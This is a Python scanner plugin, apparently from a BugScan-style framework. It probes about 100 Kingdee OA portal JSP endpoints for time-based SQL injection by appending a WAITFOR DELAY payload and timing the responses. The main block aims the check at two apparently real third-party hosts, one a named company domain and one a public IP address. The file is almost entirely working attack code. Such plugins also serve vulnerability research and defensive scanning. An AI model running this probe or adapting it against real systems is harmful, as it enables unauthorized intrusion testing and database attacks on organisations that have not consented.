#!/usr/bin/env python
# -*- coding: utf-8 -*-
#refer: http://www.wooyun.org/bugs/wooyun-2015-0140344
import time
def assign(service, arg):
    if service == "kingdee_oa":
        return True, arg

def audit(arg):
    payloads = [
"kingdee/portal/portlet/custom_Analytical/set.jsp?portal_id=1",
"kingdee/portal/portlet/custom_Analytical_diagram/set.jsp?portal_id=1",
"kingdee/portal/portlet/document/set.jsp?portal_id=1",
"kingdee/portal/portlet/document_req/set.jsp?portal_id=1",
"kingdee/portal/portlet/flow_performance_list/set.jsp?portal_id=1",
"kingdee/portal/portlet/flow_performance_show/set.jsp?portal_id=1",
"kingdee/portal/portlet/guestbook/set.jsp?portal_id=1",
"kingdee/portal/portlet/guestbook_new/set.jsp?portal_id=1",
"kingdee/portal/portlet/news_photos/set.jsp?portal_id=1",
"kingdee/portal/portlet/office_history/set.jsp?portal_id=1",
"kingdee/portal/portlet/office_process/set.jsp?portal_id=1",
"kingdee/portal/portlet/outpage/set.jsp?portal_id=1",
"kingdee/portal/portlet/person_doc_list/set.jsp?portal_id=1",
"kingdee/portal/portlet/person_mail/set.jsp?portal_id=1",
"kingdee/portal/portlet/person_new_doc/set.jsp?portal_id=1",
"kingdee/portal/portlet/person_new_mail/set.jsp?portal_id=1",
"kingdee/portal/portlet/person_new_plan/set.jsp?portal_id=1",
"kingdee/portal/portlet/person_plan/set.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_bbs/set.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_db_conn/set.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_discuss/set.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_images/set.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_links/set.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_news/set.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_new_bbs/set.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_new_discuss/set.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_new_links/set.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_new_news/set.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_new_onLine/set.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_onLine/set.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_url/set.jsp?portal_id=1",
"kingdee/portal/portlet/resource/set.jsp?portal_id=1",
"kingdee/portal/portlet/userlink/set.jsp?portal_id=1",
"kingdee/portal/portlet/custom_Analytical/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/custom_Analytical_diagram/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/document/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/document_req/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/flow_performance_list/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/flow_performance_show/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/guestbook/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/guestbook_new/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/news_photos/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/office_history/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/office_process/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/outpage/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/person_doc_list/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/person_mail/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/person_new_doc/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/person_new_mail/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/person_new_plan/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/person_plan/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_bbs/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_db_conn/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_discuss/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_images/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_links/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_news/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_new_bbs/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_new_discuss/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_new_links/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_new_news/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_new_onLine/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_onLine/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_url/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/resource/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/userlink/set_submit.jsp?portal_id=1",
"kingdee/portal/portlet/custom_Analytical/view.jsp?portal_id=1",
"kingdee/portal/portlet/custom_Analytical_diagram/view.jsp?portal_id=1",
"kingdee/portal/portlet/document/view.jsp?portal_id=1",
"kingdee/portal/portlet/document_req/view.jsp?portal_id=1",
"kingdee/portal/portlet/flow_performance_list/view.jsp?portal_id=1",
"kingdee/portal/portlet/flow_performance_show/view.jsp?portal_id=1",
"kingdee/portal/portlet/guestbook/view.jsp?portal_id=1",
"kingdee/portal/portlet/guestbook_new/view.jsp?portal_id=1",
"kingdee/portal/portlet/news_photos/view.jsp?portal_id=1",
"kingdee/portal/portlet/office_history/view.jsp?portal_id=1",
"kingdee/portal/portlet/office_process/view.jsp?portal_id=1",
"kingdee/portal/portlet/outpage/view.jsp?portal_id=1",
"kingdee/portal/portlet/person_doc_list/view.jsp?portal_id=1",
"kingdee/portal/portlet/person_mail/view.jsp?portal_id=1",
"kingdee/portal/portlet/person_new_doc/view.jsp?portal_id=1",
"kingdee/portal/portlet/person_new_mail/view.jsp?portal_id=1",
"kingdee/portal/portlet/person_new_plan/view.jsp?portal_id=1",
"kingdee/portal/portlet/person_plan/view.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_bbs/view.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_db_conn/view.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_discuss/view.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_images/view.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_links/view.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_news/view.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_new_bbs/view.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_new_discuss/view.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_new_links/view.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_new_news/view.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_new_onLine/view.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_onLine/view.jsp?portal_id=1",
"kingdee/portal/portlet/pubinfo_url/view.jsp?portal_id=1",
"kingdee/portal/portlet/resource/view.jsp?portal_id=1",
"kingdee/portal/portlet/userlink/view.jsp?portal_id=1"
]
    for payload in payloads:
        t1 = time.time()
        code1,_,_,_,_ = curl.curl2(arg+payload)
        true_time = time.time() - t1
        t2 = time.time()
        url = arg+payload+";+WAITFOR+DELAY+'0:0:8'--"
        code2,_,_,_,_ = curl.curl2(url)
        false_time = time.time() - t2
        if code1==200 and code2 == 200 and false_time-true_time>7:
            security_hole(arg+payload)

if __name__ == '__main__':
    from dummy import *
    audit(assign('kingdee_oa', 'http://oa.guanhao.com:8080/')[1])
    audit(assign('kingdee_oa', 'http://61.190.20.51/')[1])